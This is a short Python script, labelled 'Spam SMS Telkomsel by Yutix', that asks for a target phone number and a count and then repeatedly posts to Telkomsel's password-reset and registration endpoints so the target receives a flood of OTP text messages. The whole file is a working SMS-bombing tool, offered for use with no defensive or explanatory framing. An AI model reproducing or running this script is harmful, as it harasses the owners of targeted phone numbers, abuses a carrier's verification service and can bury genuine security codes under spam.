import time, os
import requests as req
from bs4 import BeautifulSoup as bs

red = '\033[91m'
green = '\033[92m'
yellow = '\033[93m'
purple = '\033[95m'
cyan = '\033[96m'
white = '\033[37m'
off = '\033[m'

def forgot(n):
	url = 'https://nsp.telkomsel.com/account/process/processlupapassword'
	dat = {"username":n,"action":"otp","iswebview":"true","fromaccount":"false","plusaktivasi":"true"}
	raw = req.post(url,data=dat).text
	return raw

def main():
	os.system('clear')
	print(f'{yellow}> {white}Spam SMS Telkomsel by Yutix\n')
	n = input(f'  {white}Target:{cyan} ')
	x = input(f'  {white}Jumlah:{cyan} ')
	print()
	for i in range(int(x)):
		status = bs(forgot(n),'html.parser').find('div',{'class':'content container-fluid bg-3 small'}).findAll('div')[2]['class'][1]
		if status == 'alert-warning':
			url = 'https://nsp.telkomsel.com/account/process/processdaftar'
			dat = {"iswebview":"true","nohp":n[1:]}
			raw = req.post(url,data=dat).text
			print(f'  {white}[{i+1}] {green}OTP Register sent!')
		else:
			print(f'  {white}[{i+1}] {green}OTP Forgot sent!')
		time.sleep(1)
	print(f'\n  {white}Done.')

if __name__=='__main__':
	main()